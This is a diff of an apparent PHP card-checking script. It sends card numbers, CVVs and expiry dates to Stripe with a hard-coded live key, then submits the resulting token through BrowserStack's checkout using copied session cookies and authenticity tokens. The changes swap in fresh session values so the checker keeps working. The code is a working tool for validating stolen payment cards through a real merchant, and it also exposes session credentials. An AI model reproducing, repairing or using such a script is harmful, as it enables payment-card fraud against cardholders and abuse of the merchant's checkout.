@@ -139,7 +139,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]='.$zip.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=b9b7ebe3-3935-4ac0-9fef-c20705d2fffad6de7d&muid=2927481a-0805-4246-b25e-f5f842baddfacd86cd&sid=16d682c1-7e96-4a6f-b99f-3999db402b4a141c1b&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=34033&key=pk_live_40g8bjuzvlOrPg0e4GbbFEGWaD9ehS59BE6vzNgZz59YAHsT5BtwyEBGEWL5PpT2I1qrjSpxS8YOA7bipleQr74Rs000PhWZ1qY&pasted_fields=number');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=17d17a3a-2378-40cc-a10c-634c9a57ce5baae7fe&muid=49e3f178-6ed1-464d-a5cf-6e9c36787e1d72993d&sid=df76d0c7-220c-48a2-b727-94d240223c94485362&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=39425&key=pk_live_40g8bjuzvlOrPg0e4GbbFEGWaD9ehS59BE6vzNgZz59YAHsT5BtwyEBGEWL5PpT2I1qrjSpxS8YOA7bipleQr74Rs000PhWZ1qY&pasted_fields=number');
 
 
 
@@ -169,7 +169,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'accept: text/javascript, application/json',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: __cf_bm=CeOuVknu5PIqu9aBb6oZQBtJya3ONPHXvTfkhdn3dPI-1649025866-0-AY2NpX49G2kOnodSmU0V7uM6GDqDiQVZrL/0eYFpz9XdiYAUlG6Eg67gsMjt1GLsU/RjcKLUv7/nX+LzlSZTGlQ=; __cfruid=7ddf10857fb6f2ec9bc271333a65b992be70373a-1649025866; tracking_id=f3bf6bf3-b40f-44e2-b55e-d4998b664b60; _rt_uuid=_tJvItOAku9kW0kEdVGXnkIHt; _rt_sid=70JqD0peEYwJd0gVN02PspRVk; moved=1; GAstartTime=1649025882491; bs_deviceId=68f77794-6f3c-ee2b-7e54-5502ac61392a; tft_exp_allocated=signup; _session=7267c456b867e0787369beee95116428; show_freshchat=0; bs_logging_id=5946131; bs_group_id=5863465; bs_user_details={"user_details":{"user_id":5946131,"group_id":5863465},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; downtime_notified={"notifDowntime":false}; previous_session_os=win11; ab_users={"48":105,"_allocation":"58bea3cd-ad63-488e-92d0-97446886d797","54":116,"60":129,"57":123,"40":87,"58":125,"59":127,"55":119,"63":134}; ga_pa_status=npa; p_buy=false; GAlastSentTime=1649026379439',
+'cookie: __cf_bm=pfKbATAVUb_1lsVc15zIWes0l34K_tqWdPbXK8sh_wM-1649068721-0-AVCv5wWe9yYQlmRiS2Oyhl01JTn+6ulJljxA77Ue4e8TZHg2wSbBXvS7dN5EzSiKIjrTigtYB9hZFV+ph/5eg0g=; __cfruid=ec2e44a6648c0bf46a0a4844bcb725ea1739e828-1649068721; tracking_id=9bacbd1e-59f4-4314-a68b-382490564c27; moved=1; GAstartTime=1649068732999; bs_deviceId=82676dd6-1bef-0eb0-c9c4-07fd2e1858e8; p_buy=false; ab_users={"45":98,"33":-1,"36":-1,"_allocation":"aab13ce6-716f-4f5d-b4ac-537fd0c43f01","60":129,"57":123,"40":87,"58":125,"59":127,"55":119,"63":133,"48":105,"54":116}; ga_pa_status=npa; _session=094776c249b63110a0228e8313b2e7f0; bs_logging_id=5947878; bs_group_id=5865163; bs_user_details={"user_details":{"user_id":5947878,"group_id":5865163},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; bs_chat_channels=pricing_chat_without_auto_open; downtime_notified={"notifDowntime":false}; user_binary_or_native_onboarded=true; skipped_extension_install_info_4YAe0a=true; _BEAMER_USER_ID_xTSGUhhN11000=9f3a2e25-d13e-4a0f-847a-7333a012097b; _BEAMER_FIRST_VISIT_xTSGUhhN11000=2022-04-04T10:43:56.446Z; _BEAMER_FILTER_BY_URL_xTSGUhhN11000=true; show_freshchat=2; GAlastSentTime=1649069369762',
 'origin: https://www.browserstack.com',
 'referer: https://www.browserstack.com/',
 'sec-fetch-dest: empty',
@@ -180,7 +180,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=%2FKh7u0zWHDYtlUAz%2FOp6BN7gI7dAfivAJsqEPQShu6DbPVBOej6yLQuczI5ZS8b332SMCheu%2Fwg9Fz8QA9tG%2Fg%3D%3D&is_from_checkout_page=true&is_tax_checkout_page=true&stripeToken='.$id.'&cardDetails=null&authenticity_token=7W5zWMiGV3wzr%2BR50nB4hWQ1XDrK0bZ9LUCD%2B9Xn7ADK%2B1it%2Fm75ZxWmaMR30cR2ZbHzh50BYrU2nTjW0p0RXg%3D%3D');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=0b%2BdhX2NBsFnfa%2BPVdAcAYo5SJ6fN5pbQXGqfL1IaHN2LZCZuvdGmjhtydP4W9CbXUhQVq3vNJih5xT1SC5G8A%3D%3D&is_from_checkout_page=true&stripeToken='.$id.'&cardDetails=null&is_tax_checkout_page=true&is_single_form_checkout=true&authenticity_token=f444sb1bvUmGJCVTBeEryk8fl%2FrnX3kFvxQqYljUr8nYHDWteiH9Etk0Qw%2BoaudQmG6PMtWH18ZfgpTrrbKBSg%3D%3D');
 
 
 $result2 = curl_exec($ch);
